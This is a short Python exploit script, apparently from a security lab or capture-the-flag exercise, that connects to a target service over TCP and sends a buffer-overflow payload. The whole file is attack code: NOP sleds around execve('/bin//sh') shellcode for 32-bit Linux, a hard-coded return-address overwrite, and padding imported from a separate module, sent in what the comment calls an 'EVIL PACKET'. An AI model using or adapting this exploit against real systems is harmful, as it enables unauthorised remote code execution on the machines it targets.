from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):

    HOST = target_machine
    PORT = target_port
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

   

    #NEED padding of 96
    shellcode = b"\x90" *30
    shellcode += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
    shellcode += b"\x90"*42
   


    eip_overwrite = b"\x2a\x6a\x06\x08"
    #eip_overwrite = "AAAA"
 

    # Send EVIL PACKET !
    s.sendall(buf + shellcode  + eip_overwrite + buf)
    s.close()